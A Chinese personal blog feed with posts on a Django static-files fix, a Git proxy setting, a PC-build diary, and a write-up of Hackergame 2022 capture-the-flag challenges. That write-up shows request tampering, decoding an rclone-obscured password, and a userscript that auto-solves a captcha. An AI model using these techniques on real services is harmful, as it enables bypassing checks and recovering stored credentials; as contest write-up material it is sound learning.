        <content type="html"><![CDATA[<h2 id="问题起因"><a href="#问题起因" class="headerlink" title="问题起因"></a>问题起因</h2><p>最近把一个Django项目部署上服务器的时候，发现了一个问题。在收集静态资源的时候，发现后台Admin的样式资源不生效，</p><p>具体表现在，执行了collectstatic命令后，提示copy成功</p><p><img src="http://cdn.lmark.cc/img/image-20221202190134796.png"></p><p>但是实际上，项目目录下并没有收集到文件。</p><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>反复收集了几次，还是不生效。都显示已经收集了，并没有修改。</p><p><img src="http://cdn.lmark.cc/img/image-20221202190509177.png"></p><p>首先一开始我先按照网上的方法，排除了一些常规的原因，然后开始想想还能有什么离谱的bug，先看看配置文件。</p><p><img src="http://cdn.lmark.cc/img/image-20221202190909066.png"></p><p>看似并没有什么问题，也确实没什么问题。但实际上这是个巨坑的地方</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>非常坑爹的一个地方，先把<code>STATICFILES_DIRS</code>给注释掉，然后再把<code>STATIC_ROOT</code>里的<code>/static/</code>给改成<code>static</code>，如下图：</p><p><img src="http://cdn.lmark.cc/img/image-20221202191906353.png"></p><p>这样一来就能正常收集了</p><p><img src="http://cdn.lmark.cc/img/image-20221202191757006.png"></p><p>在收集完静态文件后记得把settings修改回来。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Django </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>Git配置全局代理解决10054问题</title>
      
      <link href="/archives/5f2a3725.html"/>
      <url>/archives/5f2a3725.html</url>
      
        <content type="html"><![CDATA[<h2 id="问题复现"><a href="#问题复现" class="headerlink" title="问题复现"></a>问题复现</h2><p>最近装了新电脑，很多东西都没配置，都是很久以前在笔记本上配置的。结果现在台式上有一堆环境问题，就比如今天这个Git推送的问题就是一个。</p><p>众所周知，由于某些不可抗力因素，github在的登录属于一个玄学的问题，偶尔运气好就能裸连，运气不好直接连push都push不上。</p><p><img src="http://cdn.lmark.cc/img/image-20221129092528293.png"></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>为了解决这个问题，我们一般想到的方法就是走一下代理，但是<code>Clash</code>开启之后，我们可以在网页端正常访问github，但是push还是不行。问题的根源是：普通的代理模式，流量都是走一个特定的端口，与服务器通信，但是git的流量不会走。所以我们需要手动绑定一下代理。</p><p>方法非常简单，这里以Clash为例，其他软件的配置也大差不差。</p><p>打开Clash，马上就可以看到它使用的代理端口，这里为<code>7890</code></p><p><img src="http://cdn.lmark.cc/img/image-20221129093138144.png"></p><p>接下来，给git设置代理，方法如下：</p><h3 id="方法一-直接使用命令"><a href="#方法一-直接使用命令" class="headerlink" title="方法一 直接使用命令"></a>方法一 直接使用命令</h3><p>直接在Bash里输入命令设置全局http&#x2F;https代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy http://127.0.0.1:7890</span><br><span class="line"> </span><br><span class="line">git config --global https.proxy https://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>这样以后使用Clash时，git也能走代理了</p><h3 id="方法二-修改配置文件"><a href="#方法二-修改配置文件" class="headerlink" title="方法二 修改配置文件"></a>方法二 修改配置文件</h3><p>打开配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi ~/.gitconfig</span><br></pre></td></tr></table></figure><p>在文件末尾添加配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[http]</span><br><span class="line"> </span><br><span class="line">proxy = http://127.0.0.1:7890</span><br><span class="line"> </span><br><span class="line">[https]</span><br><span class="line"> </span><br><span class="line">proxy = https://127.0.0.1:7890</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>保存退出，重启一下git，结果也是立竿见影。</p><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>改了之后马上就会生效，无论是push还是clone都没有问题了。记得开代理就行。</p><p><img src="http://cdn.lmark.cc/img/image-20221129094611168.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> 代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>第一次组装自己的电脑的经历</title>
      
      <link href="/archives/ba5d5beb.html"/>
      <url>/archives/ba5d5beb.html</url>
      
        <content type="html"><![CDATA[<h2 id="开头"><a href="#开头" class="headerlink" title="开头"></a>开头</h2><p>搬到新校区，宿舍终于不断电了，考虑了很久的台式机计划终于可以搞了，加上第三个项目预支了4000的项目款，终于可以组一台自己的电脑了</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>声明：我没有仔细挑过。而且这方面可以说是一窍不通，看了一周视频速成了一下。</p><ul><li>主板： 华硕 TUF B550M-PLUS WIFI Ⅱ</li><li>显卡：5700G的核显</li><li>CPU：锐龙7 5700G 盒装（带风扇）</li><li>内存：科赋雷霆马甲条3600MHz 16G ×2</li><li>电源：艾湃电竞金牌全模组650W</li><li>硬盘：三星980 1TB版</li><li>机箱：长城 阿基米德9PRO</li><li>散热：原装</li></ul><p>因为买的时候打算当传家宝来用了，所以有些配置是冗余的，价格偏贵。至于总共价格，留到后面再说。</p><h2 id="组装"><a href="#组装" class="headerlink" title="组装"></a>组装</h2><p>组装电脑的过程还是挺有趣的，虽然遇到了不少问题。机箱是最先到的，结果拿到手后才发现机箱有点大过头了，毕竟可以兼容E-ATX主板。</p><p><img src="http://cdn.lmark.cc/img/wx_camera_1667965663108.jpg" alt="wx_camera_1667965663108">首先先是主板，装主板可以说是最复杂的了。不仅有许多排线，还有很多螺丝需要拧。</p><p><img src="http://cdn.lmark.cc/img/IMG_20221109_120719.jpg" alt="IMG_20221109_120719"></p><p>第一步，先装CPU，拆开CPU的时候，没想到CPU竟然这么重，沉甸甸的，感觉发热会不小。</p><p><img src="http://cdn.lmark.cc/img/IMG_20221109_120739.jpg" alt="IMG_20221109_120739"></p><p><img src="http://cdn.lmark.cc/img/IMG_20221109_120737.jpg" alt="IMG_20221109_120737"></p><p>小心翼翼地打开主板的卡扣，然后小心翼翼地取出CPU，看着密密麻麻的针脚，真想给他全部薅弯。装的时候，我和舍友研究了好一会CPU的方向，后面发现原来有防呆口。</p><p><img src="http://cdn.lmark.cc/img/IMG_20221109_121031.jpg" alt="IMG_20221109_121031"></p><p>接下来就是装散热了，本来买了个双塔散热，但是发现好像太大了，对我的性能来说过于冗余，就退货了，选择原装的散热。下图是工具人舍友在装风扇</p><p><img src="http://cdn.lmark.cc/img/IMG_20221109_121919.jpg" alt="IMG_20221109_121919"></p><p>接下来就是装内存条了，这个没什么难度，只要不傻， 不大力出奇迹，就好。</p><p><img src="http://cdn.lmark.cc/img/IMG_20221109_121935.jpg" alt="IMG_20221109_121935"></p><p>然后就是固态，这个也没什么难度，把螺丝拧下来，插上去，拧回去就装好了，我没装散热条啥的</p><p><img src="http://cdn.lmark.cc/img/IMG_20221109_131406.jpg" alt="IMG_20221109_131406"></p><p>主板方面已经完工了，接下来是装电源，电源也有防呆口，所以很好装。因为我们宿舍限电200W，所以舍友很担心我开机时候会不会跳闸。</p><p><img src="http://cdn.lmark.cc/img/IMG_20221109_122355.jpg" alt="IMG_20221109_122355"></p><p>装好电源后，再把主板装进机箱里，这时候就是最难的一步了。接线，不仅是电源线，还有机箱线，无线网卡的线。我和舍友照着说明书，嗯装了好久，第一遍接上了线。但是主板开机自检没过。看报错是memory灯亮了，说明是内存条的问题，然后我就把内存条换了俩插槽重新开机，还是一样的错误，再插，再报错。。。。。当问了客服和百度仍无果后，一度想放弃，一以为是主板的问题。然后我突然发现，CPU的电源线没插，然后我把它插上去之后，终于能开机了！！！</p><p>接下来就是装系统了，这个没什么难度，借（指趁白佬睡着去他宿舍拿）了个系统盘，就开始了</p><p><img src="http://cdn.lmark.cc/img/IMG_20221109_143115.jpg" alt="IMG_20221109_143115"></p><p>装好后就能正常使用了。</p><p>但是真的结束了嘛？</p><p>因为这个机箱是侧开门的玻璃机箱，在装机的时候我把门给卸了下来，防止弄坏玻璃，就打算装好电脑后再把门装上。殊不知，装门成了整个装机过程中最最最难得环节！！！沃日。</p><p><img src="http://cdn.lmark.cc/img/1667994937503.jpg" alt="1667994937503"></p><p>明明在取下来的时候非常丝滑，结果后面死活装不上去，三个人折腾了快一个小时，最后只能把转轴的铁给削掉一点才行。</p><p>不过，经历了这么多，装好后体验感真的爆棚</p><p><img src="http://cdn.lmark.cc/img/image-20230103091804169.png"></p><h2 id="一个月体验"><a href="#一个月体验" class="headerlink" title="一个月体验"></a>一个月体验</h2><p>十一月装好，用了一个月，简单讲讲体验情况，以及存在的一些问题。</p><p>体验：非常爽啊，地表最强核显不是盖的，理论性能干gtx1050，日常打打骑砍二还是很流畅的，MC1.19也能百帧。另外32G内存，开几十个窗口都不卡，980固态启动速度很快，作为台式机，很符合我的需求。</p><p>缺点有几个，首先是主板的问题，华硕主板传统艺能之烧WIFI和蓝牙，一个月掉了两次，早知道当时应该买网卡自己组才好。其次就是新电脑数据迁移问题和文件同步问题，因为我的笔记本还是要用的，而且当时还要上课，有一些环境得重新配，当时挺麻烦的，后来受召哥提点，知道了坚果云，就尝试用了一下，感觉不错，两台电脑同步文件。</p><h2 id="半年体验"><a href="#半年体验" class="headerlink" title="半年体验"></a>半年体验</h2><p>今天是2023年5月7日，距离去年十一月装好到现在已经过了半年了，浅浅分享一下宿舍台式机体验。</p><p>半年基本上没带过笔记本出门了，因为去实验室有电脑，所以可以直接在实验室远程连接宿舍电脑来使用，体验非常好，平时上课就带Ipad和键盘来连接电脑。</p><p>在宿舍的话，因为我们宿舍不断电，所以路由器和电脑可以24小时开着，同时我的小爱音响还可以联动开机卡，实现远程开关电脑，也比较方便。</p><p>至于打游戏，半年了还是没有买显卡，现在也就打点小游戏了，不过平时忙着学习了，也不怎么打游戏了。</p><p>因为一直没买显卡，然后一开始买的机箱太大，所以后面就换成了，小喆C2P的MATX机箱，是我原来的机箱的三分之一大小。之后怕小机箱散热不好，又买了两把14cm的利民风扇，和一把10cm的小风扇用来散热。大概成品如下：</p><p><img src="https://cdn.lmark.cc/img/image-20230507160407911.png"></p><p>关了RGB光污染之后，机箱的声音其实挺小的，小机箱还是很不错的</p><h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>台式机太爽了！如果以后宿舍断电打算搬去社团工位，24小时开机，当服务器用，毕竟32G内存嘿嘿。关于显卡，本来打算冲3060，但是后面想想，买了显卡可能彻底不用学习了，遂没买（绝对不是因为没钱）。</p><p>最后，整套电脑价格是多少呢?</p><p>答案是：2017.36（板U） + 1170.64（内存条+电源）+699（固态）+ 258.33（机箱）</p><p>&#x3D; 4145.33 </p><p>对于第一次装机的我来说，还可以接受，毕竟要当传家宝来用</p>]]></content>
      
      
      
        <tags>
            
            <tag> 电脑 </tag>
            
            <tag> 装机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>HackGame2022部分题解（签到——微积分小练习）</title>
      
      <link href="/archives/dc57b028.html"/>
      <url>/archives/dc57b028.html</url>
      
        <content type="html"><![CDATA[<p>总所周知，中科大每年都会举办一个HackGame，今年也不例外。</p><p>今年的比赛从2022 年 10 月 22 日 中午 12:00开始，到 10 月 29 日 中午 12:00（共七天）。在这7天里，我们可以不吃不喝来夺旗（bushi）。题目有难有易，而且对新手还挺友好，像我这样毛都没学过的都可以浅浅拿个1900。遂写篇博客浅浅记录一下这个比赛经历。</p><p><img src="http://cdn.lmark.cc/img/image-20221107105639243.png"></p><p>先贴一下结果。我好菜呜呜，主要记录一下一些我觉得有意思的题目和解题方法。为了记录一下，我怕我以后都忘记我还会写这个。</p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="http://cdn.lmark.cc/img/image-20221107110043374.png"></p><p>在规定时间内写下2022来签到。</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>其实只要手速超过光速，可以直接签下四个大字即可（bushi）。要是你没有这么快的手速，还是老老实实找一下方法把，可以看到，他是本地识别，然后再将识别结果用GET请求传给后端。</p><p><img src="http://cdn.lmark.cc/img/image-20221107110439346.png"></p><p>所以只要直接修改GET请求，修改为2022即可。</p><p><img src="http://cdn.lmark.cc/img/image-20221107110514897.png"></p><h2 id="猫咪问答喵"><a href="#猫咪问答喵" class="headerlink" title="猫咪问答喵"></a>猫咪问答喵</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p><img src="http://cdn.lmark.cc/img/image-20221107110548870.png"></p><p><img src="http://cdn.lmark.cc/img/image-20221107110601603.png"></p><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>猫咪问答可以说是Hackgame的经典题目了，是一道有关中科大的信息收集题。如果你有中科大同学你可以直接去问问他们（bushi）</p><p>先讲一下前三题，</p><h4 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h4><p>直接在浏览器搜索<strong>中国科学技术大学 NEBULA 战队</strong>，第一篇里面就有。</p><p><img src="http://cdn.lmark.cc/img/image-20221107111040429.png"></p><h4 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h4><p>直接贴官方题解好了</p><p><img src="http://cdn.lmark.cc/img/image-20221107111434374.png"></p><h4 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h4><p>同</p><p><img src="http://cdn.lmark.cc/img/image-20221107111550358.png"></p><h4 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h4><p>先去Github上找到Linux的仓库<a href="https://github.com/torvalds/linux">torvalds&#x2F;linux: Linux kernel source tree (github.com)</a></p><p>直接在仓库力搜索这个错误代号</p><p><img src="http://cdn.lmark.cc/img/image-20221107111817644.png"></p><p>这个commit记录就在这<a href="https://github.com/torvalds/linux/commit/dcd46d897adb70d63e025f175a00a89797d31a43">exec: Force single empty string when argv is empty · torvalds&#x2F;linux@dcd46d8 (github.com)</a></p><p><img src="http://cdn.lmark.cc/img/image-20221107111856254.png"></p><h4 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h4><p>可以说是六道题中我写的最久的一道题，之前一直想着有没有什么工具可以直接公国ssh 公钥查找域名，结果找了很多，都没找到方法。然后直接把这一整个密钥信息拿去搜索也啥都搜不到</p><p><img src="http://cdn.lmark.cc/img/image-20221107112209932.png"></p><p>之后又找了很多，关于这方面的东西，确定了，只有网站自己把公钥地址贴出来，我们才能搜到，而不是通过DNS来找，然后我直接把那串十六进制密钥粘贴去必应（谷歌也行）搜索了一下。</p><p>然后就给我找到了</p><p><img src="http://cdn.lmark.cc/img/image-20221107112708534.png"></p><p>看起来指向了一个神秘网址，刚好就是一个六个字母的域名<a href="http://sdf.org/">SDF Public Access UNIX System - Free Shell Account and Shell Access</a></p><p><img src="http://cdn.lmark.cc/img/image-20221107112810563.png"></p><p>嗯，很复古的界面。这是一个免费的公共UNIX服务器。</p><h5 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解"></a>官方题解</h5><p>原来真有通过SSH指纹来搜索域名的网站<a href="www.shodan.io">www.shodan.io</a></p><p>是我见识短浅了</p><p><img src="http://cdn.lmark.cc/img/image-20221107113922675.png"></p><h4 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h4><p>也是嗯搜就可以了，这里贴个官方题解</p><p><img src="http://cdn.lmark.cc/img/image-20221107114026862.png"></p><h2 id="家目录里的秘密"><a href="#家目录里的秘密" class="headerlink" title="家目录里的秘密"></a>家目录里的秘密</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p><img src="http://cdn.lmark.cc/img/image-20221107114232931.png"></p><p>题目压缩包下载链接：<a href="https://cdn.lmark.cc/source/user_home.tar.gz">下载链接哟</a></p><h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><h4 id="VS-Code-里的-flag"><a href="#VS-Code-里的-flag" class="headerlink" title="VS Code 里的 flag"></a>VS Code 里的 flag</h4><p>先把项目解压出来，然后拖入VSCode中，可以很清晰的看到整个文件夹结构，然后利用VSCode的搜索功能，直接搜索<code>flag</code>就可以找到第一个flag了。</p><p><img src="http://cdn.lmark.cc/img/image-20221107114948278.png"></p><h4 id="Rclone-里的-flag"><a href="#Rclone-里的-flag" class="headerlink" title="Rclone 里的 flag"></a>Rclone 里的 flag</h4><p>通过刚刚搜索flag可以发现，有一个Rclone的配置文件，上面写着大大的Flag2，看起来显然就是Flag2的关键道具</p><p><img src="http://cdn.lmark.cc/img/image-20221107115308531.png"></p><p>其实这题当时没做出来哈哈哈哈，难绷</p><p>参考一下官方的题解，</p><h4 id="官方题解-1"><a href="#官方题解-1" class="headerlink" title="官方题解"></a>官方题解</h4><p>因为ftp服务器传的密码是需要明码的，所以他这里的加密是可逆的，也就是混淆。有方法可以还原的。翻翻代码，可以发现有一个函数就是干这个的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> obscure</span><br><span class="line"></span><br><span class="line"><span class="comment">// 省略部分代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Reveal an obscured value</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Reveal</span><span class="params">(x <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">ciphertext, err := base64.RawURLEncoding.DecodeString(x)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, fmt.Errorf(<span class="string">&quot;base64 decode failed when revealing password - is it obscured?: %w&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(ciphertext) &lt; aes.BlockSize &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;input too short when revealing password - is it obscured?&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">buf := ciphertext[aes.BlockSize:]</span><br><span class="line">iv := ciphertext[:aes.BlockSize]</span><br><span class="line"><span class="keyword">if</span> err := crypt(buf, buf, iv); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, fmt.Errorf(<span class="string">&quot;decrypt failed when revealing password - is it obscured?: %w&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="type">string</span>(buf), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// MustReveal reveals an obscured value, exiting with a fatal error if it failed</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MustReveal</span><span class="params">(x <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">out, err := Reveal(x)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;Reveal failed: %v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> out</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以，可以直接调用这个函数了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">        <span class="string">&quot;fmt&quot;</span></span><br><span class="line">        <span class="string">&quot;github.com/rclone/rclone/fs/config/obscure&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        fmt.Println(obscure.MustReveal(<span class="string">&quot;tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>写给没有Go环境的人</p><ol><li>下载GO安装包，安装<a href="https://golang.google.cn/dl/">Downloads - The Go Programming Language (google.cn)</a></li></ol><p><img src="http://cdn.lmark.cc/img/image-20221107160901394.png"></p><ol start="2"><li><p>如果没添加环境变量，则可以直接进到GO安装目录下<code>C:\Program Files\Go\bin</code></p></li><li><p>先 <code>go mod init &lt;name&gt;</code> 生成 go package（<code>&lt;name&gt;</code> 换成你喜欢的名字）</p></li><li><p>将需要运行的 go 代码放进一个 go 文件里（注意这里 <code>package</code> 需要为 <code>main</code>），然后 <code>go run your_file.go</code></p></li><li><p>按照给出的提示下载缺少的依赖（<code>go get github.com/rclone/rclone/fs/config/obscure</code>）需要魔法</p></li></ol></blockquote><p>跑出来代码后：</p><p><img src="http://cdn.lmark.cc/img/image-20221107161242547.png"></p><h2 id="HeiLang"><a href="#HeiLang" class="headerlink" title="HeiLang"></a>HeiLang</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><p>​<img src="http://cdn.lmark.cc/img/image-20221107163611164.png"></p><h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>整个比赛除了签到题之外，最简单的一道题。解法可以说是多种多样，这里我分享一下我的解法。</p><p>现在python刚好没有这种运算规则，但是我们自定义出来，那不久有了？</p><p>所以我的想法是写一个魔法方法，来实现这个功能就好。</p><p>自定义一个LIst类，写一个索引时候的方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class L(list):</span><br><span class="line">    def __init__(self, values=None):</span><br><span class="line"></span><br><span class="line">        self.values = values</span><br><span class="line">    def __setitem__(self, key,value):</span><br><span class="line">        if isinstance(key,int):</span><br><span class="line">            self.values[key] = value</span><br><span class="line">        else:</span><br><span class="line">            for i in key:</span><br><span class="line">               </span><br><span class="line">                self.values[i] = value</span><br><span class="line">        </span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return self.values</span><br></pre></td></tr></table></figure><p>然后，还是得稍微把每一个<code>|</code>给替换成<code>,</code>，这样传进去的参数就是一个不定长的元组，然后再分别赋值。</p><p><img src="http://cdn.lmark.cc/img/image-20221107164733923.png"></p><p>最后直接跑一下，输出结果：</p><p><img src="http://cdn.lmark.cc/img/image-20221107165136981.png"></p><blockquote><p>偷偷插一句：Python自带的IDLE真好用！！！</p></blockquote><h2 id="Xcaptcha"><a href="#Xcaptcha" class="headerlink" title="Xcaptcha"></a>Xcaptcha</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><p><img src="http://cdn.lmark.cc/img/image-20221107165424721.png"></p><h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p>哈哈哈哈哈哈，题目超好笑的诶。咳咳，这道题是一个Web题，需要我们在3秒内计算三个大数相加。</p><p><img src="http://cdn.lmark.cc/img/image-20221107170911961.png"></p><p>最简单的方法，找一个神童，让他光速算完并提交结果。</p><p>如果找不到，人类就寄了（bushi）</p><p>其实，还有个方法，写js脚本。</p><p>由于我没学过JS，不太会写脚本，所以浅浅请教了一下张哥JS怎么注入。</p><p>张哥很快啊，啪的一下就教我怎么写，他说，我可以用油猴来写。代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         调试</span></span><br><span class="line"><span class="comment">// @namespace    http://202.38.93.111:10047/xcaptcha</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  try to take over the world!</span></span><br><span class="line"><span class="comment">// @author       You</span></span><br><span class="line"><span class="comment">// @match       http://202.38.93.111:10047/xcaptcha</span></span><br><span class="line"><span class="comment">// @icon         https://www.google.com/s2/favicons?sz=64&amp;domain=microsoft.com</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">largeNumAdd</span>(<span class="params">num1, num2</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> maxLength = <span class="title class_">Math</span>.<span class="title function_">max</span>(num1.<span class="property">length</span>, num2.<span class="property">length</span>);</span><br><span class="line">        <span class="comment">//num1和num2位数对齐，位数较小的前面补0</span></span><br><span class="line">        num1 = num1.<span class="title function_">padStart</span>(maxLength, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        num2 = num2.<span class="title function_">padStart</span>(maxLength, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        <span class="keyword">let</span> res = <span class="string">&#x27;&#x27;</span>;<span class="comment">//存放最后得到的结果</span></span><br><span class="line">        <span class="keyword">let</span> figure = <span class="number">0</span>;<span class="comment">//figure = 两个数字对应位数数值相加 + 进位</span></span><br><span class="line">        <span class="keyword">let</span> currentNum = <span class="number">0</span>;<span class="comment">//对应位数的结果</span></span><br><span class="line">        <span class="keyword">let</span> carry = <span class="number">0</span>;<span class="comment">//进位</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=num1.<span class="property">length</span>-<span class="number">1</span>; i&gt;=<span class="number">0</span>; i--) &#123;</span><br><span class="line">            figure = <span class="built_in">parseInt</span>(num1[i]) + <span class="built_in">parseInt</span>(num2[i]) + carry;</span><br><span class="line">            currentNum = figure % <span class="number">10</span>;</span><br><span class="line">            carry = <span class="title class_">Math</span>.<span class="title function_">floor</span>(figure / <span class="number">10</span>);</span><br><span class="line">            res = currentNum + res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> labels = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;label&#x27;</span>)</span><br><span class="line">    <span class="keyword">var</span> results=[]</span><br><span class="line">    labels.<span class="title function_">forEach</span>(<span class="function">(<span class="params">ele</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> strs = ele.<span class="property">innerText</span>.<span class="title function_">split</span>(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">        <span class="keyword">let</span> num1 = strs[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">let</span> num2 = strs[<span class="number">1</span>].<span class="title function_">split</span>(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        results.<span class="title function_">push</span>(<span class="title function_">largeNumAdd</span>(num1, num2))</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">let</span> inputs = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;input&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i&lt; inputs.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        